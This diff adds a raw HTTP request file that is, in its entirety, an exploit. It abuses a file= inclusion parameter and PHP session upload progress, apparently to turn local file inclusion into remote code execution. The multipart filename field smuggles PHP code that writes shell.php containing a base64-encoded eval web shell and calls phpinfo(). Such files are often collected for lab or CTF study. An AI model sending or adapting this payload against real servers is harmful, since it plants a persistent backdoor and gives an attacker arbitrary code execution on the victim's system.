@@ -1,0 +1,21 @@
+POST /index.php?file=/var/lib/php/sessions/sess_shell HTTP/1.1
+Host: 127.0.0.1
+Hello: 1
+User-Agent: curl/7.68.0
+Accept: */*
+Cookie: PHPSESSID=shell
+Content-Length: 420
+Content-Type: multipart/form-data; boundary=------------------------0429a53d19de00c3
+Connection: close
+
+--------------------------0429a53d19de00c3
+Content-Disposition: form-data; name="PHP_SESSI0N_UPLOAD_PROGRESS"
+
+aaa
+--------------------------0429a53d19de00c3
+Content-Disposition: form-data; name="a"; filename="<?php file_put_contents('shell.php',base64_decode('PD9waHAgZXZhbCgkX1JFUVVFU1RbImNvZGUiXSk7Pz4='));phpinfo();?>"
+Content-Type: application/octet-stream
+
+1
+
+--------------------------0429a53d19de00c3--
